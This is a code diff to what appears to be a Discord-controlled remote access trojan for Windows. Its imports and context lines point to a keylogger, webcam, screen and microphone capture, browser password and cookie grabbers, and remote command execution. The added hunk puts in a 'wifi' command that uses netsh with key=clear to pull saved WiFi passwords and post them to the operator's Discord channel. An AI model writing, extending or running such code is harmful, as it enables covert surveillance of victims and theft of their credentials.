@@ -1,32 +1,32 @@
-import discord
+from cv2 import VideoCapture, imwrite, CAP_DSHOW
 from pynput.keyboard import Key, Listener
-from shutil import copy2, rmtree
-import os
-import sys
-from PIL import ImageGrab
-from pathlib import Path
+from resources.passwords_grabber import *
+from browser_history import get_history
+from resources.get_cookies import *
 from urllib.request import urlopen
+from scipy.io.wavfile import write
 from filesplit.split import Split
 from filesplit.merge import Merge
-from itertools import islice
+from shutil import copy2, rmtree
 from psutil import process_iter
-import time
-from getpass import getuser
-import pyaudio
-from cv2 import VideoCapture, imwrite, CAP_DSHOW
-import subprocess
-from zipfile import ZipFile
-import asyncio
-import sounddevice
-from scipy.io.wavfile import write
-from browser_history import get_history
+from itertools import islice
 from threading import Thread
+from resources.misc import *
+from getpass import getuser
+from zipfile import ZipFile
+from PIL import ImageGrab
+from pathlib import Path
+import sounddevice
+import subprocess
+import pyautogui
+import discord
+import pyaudio
+import asyncio
 import winreg
 import struct
-import pyautogui
-from resources.misc import *
-from resources.passwords_grabber import *
-from resources.get_cookies import *
+import time
+import sys
+import os
 ###############################################################################
 ##                                                                           ##
 ##   DISCLAIMER !!! READ BEFORE USING                                        ##
@@ -65,6 +65,8 @@ guild_id = None
 # - Don't change anything below unless - #
 # - you know exacly what are you doing - #
 # -------------------------------------- #
+
+    
 
 
 client = discord.Client(intents=discord.Intents.all())
@@ -574,6 +576,37 @@ async def on_message(message):
                             await message.channel.send('```Grabbing cookies. Please wait...```')
                         else:
                             reaction_msg = await message.channel.send('``Cookies are being collected. Please be patient...``'); await reaction_msg.add_reaction('🔴')
+
+                    elif message.content[6:].lower() == 'wifi':
+                        networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
+                        polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
+                        polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']
+
+                        for i in polish_bytes:
+                            networks = networks.replace(i, polish_chars[polish_bytes.index(i)])
+
+                        network_names_list = []
+                        for profile in networks.split('\n'):
+                            if ': ' in profile:
+                                network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))
+
+                        result, password = {}, ''
+                        for network_name in network_names_list:
+                            command = 'netsh wlan show profile "' + network_name + '" key=clear'
+                            current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
+                            for i in polish_bytes:
+                                current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
+                            for line in current_result.split('\n'):
+                                if 'Key Content' in line:
+                                    password = line[line.find(':')+2:-1]
+                            result[network_name] = password
+                        
+                        embed=discord.Embed(title='Grabbed WiFi passwords', color=0x0084ff)
+                        for network in result.keys():
+                            embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
+
+                        await message.channel.send(embed=embed)
+
 
             elif message.content[:8] == '.execute':
                 await message.delete()
